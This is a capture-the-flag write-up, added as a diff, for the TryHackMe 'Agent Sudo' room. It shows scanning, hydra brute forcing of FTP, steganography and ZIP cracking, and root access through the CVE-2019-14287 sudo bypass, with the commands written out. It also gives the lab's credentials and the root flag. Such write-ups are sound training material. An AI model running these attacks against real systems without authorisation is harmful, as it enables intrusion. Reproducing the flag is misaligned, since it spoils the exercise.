@@ -1,0 +1,254 @@
+1. Executive Summary
+
+This assessment was conducted against the Agent Sudo TryHackMe room.
+The objective was to identify vulnerabilities, exploit exposed services, obtain user and root-level access, and capture all flags.
+
+The engagement resulted in full system compromise through a combination of HTTP header manipulation,
+credential brute forcing, steganography, weak password practices and
+a known sudo vulnerability (CVE-2019-14287).
+
+2. Scope & Objectives
+
+In Scope
+
+Web service (HTTP)
+FTP service
+SSH service
+Local privilege escalation
+
+Objectives
+
+Enumerate exposed services
+
+Gain initial access
+
+Escalate privileges to root
+
+Identify Agent R
+
+Capture all flags
+
+3. Reconnaissance
+3.1 Web Application Reconnaissance
+
+The web application homepage displayed the following message:
+
+“Dear agents,
+Use your own codename as user-agent to access the site.
+From,
+Agent R”
+
+A TryHackMe hint suggested modifying the HTTP User-Agent header.
+
+3.2 User-Agent Manipulation
+
+A browser User-Agent switcher was used to modify the User-Agent string to "C".
+
+This revealed a hidden resource:
+
+agent_C_attention.php
+
+Discovered Message:
+
+Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP.
+Also, change your god damn password, is weak!
+
+From,
+Agent R
+
+Key Findings:
+
+Valid username identified: chris
+
+Password hygiene issue implied
+
+Mention of Agent J
+
+4. Enumeration
+4.1 Network Scanning (Nmap)
+sudo nmap -sC -sV --version-intensity 5 -O --osscan-guess -T4 -Pn 10.82.180.149 -p-
+
+Open Ports Identified:
+
+Port	Service	Version
+21	FTP	vsftpd 3.0.3
+22	SSH	OpenSSH 7.6p1
+80	HTTP	Apache 2.4.29
+
+Operating System Guess: Ubuntu Linux
+Network Distance: 3 hops
+
+4.2 Directory Enumeration (Gobuster)
+gobuster dir -u http://10.82.180.149 -w /usr/share/wordlists/dirb/common.txt
+
+Results:
+
+No sensitive directories discovered
+
+Enumeration yielded no additional attack surface
+
+5. Exploitation
+5.1 FTP Access
+
+Anonymous FTP login was attempted and failed.
+
+Given the previously identified username (chris), a targeted brute-force attack was performed.
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.82.180.149
+
+Valid Credentials Discovered:
+
+Username: chris
+Password: crystal
+5.2 File Retrieval
+
+The following files were retrieved from the FTP server:
+
+cute-alien.jpg
+
+cutie.png
+
+To_agentJ.txt
+
+Contents of To_agentJ.txt:
+Dear agent J,
+
+All these alien like photos are fake!
+Agent R stored the real picture inside your directory.
+Your login password is somehow stored in the fake picture.
+
+From,
+Agent C
+
+Conclusion:
+
+Agent J’s credentials are hidden via steganography
+
+Likely target user: james
+
+5.3 Steganography Analysis
+stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
+
+Results:
+
+Passphrase found: Area51
+
+Extracted file: message.txt
+
+Extracted Message:
+Hi james,
+
+Your login password is hackerrules!
+
+Your buddy,
+chris
+
+Credentials Obtained:
+
+Username: james
+Password: hackerrules!
+
+5.4 ZIP File Password Recovery
+
+The ZIP file discovered was extracted using john.
+
+zip2john 8702.zip > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+ZIP Password: alien
+
+Decoded Message:
+
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' (Base64: Area51)
+
+By,
+Agent R
+
+5.5 OSINT Image Analysis
+
+The file Alien_autospy.jpg was retrieved from /home/james.
+
+The image depicted the Roswell alien autopsy, satisfying the OSINT question.
+
+6. User-Level Access
+
+The user flag was located at:
+
+/home/james/user_flag.txt
+
+7. Privilege Escalation
+7.1 Sudo Permissions
+sudo -l
+
+Result:
+
+(ALL, !root) /bin/bash
+
+This configuration is vulnerable to CVE-2019-14287, allowing bypass of the !root restriction.
+
+7.2 Exploitation of CVE-2019-14287
+sudo -u#-1 /bin/bash
+
+Outcome: Root shell obtained
+
+7.3 Root Flag
+
+Location:
+
+/root/root.txt
+
+Message:
+
+Your flag is
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+8. Bonus Objective
+
+Identity of Agent R:
+DesKel
+
+9. Post-Exploitation
+
+A full SUID binary enumeration was conducted:
+
+find / -perm -4000 2>/dev/null
+
+Multiple SUID binaries were identified, reinforcing the importance of privilege auditing and patch management.
+
+10. Reporting & Recommendations
+Key Vulnerabilities Identified
+
+Weak password practices
+
+Exposed FTP service with brute-forceable credentials
+
+Sensitive information disclosure via HTTP headers
+
+Steganographic credential storage
+
+Vulnerable sudo version (CVE-2019-14287)
+
+Recommendations
+
+Enforce strong password policies
+
+Disable unnecessary services (FTP)
+
+Patch sudo to latest version
+
+Monitor HTTP headers and access logs
+
+Restrict sudo permissions carefully
+
+11. Conclusion
+
+The Agent Sudo machine was fully compromised from unauthenticated access to root through chained vulnerabilities.
+This lab effectively demonstrates the risks of poor credential hygiene,
+misconfigured sudo permissions, and outdated software.
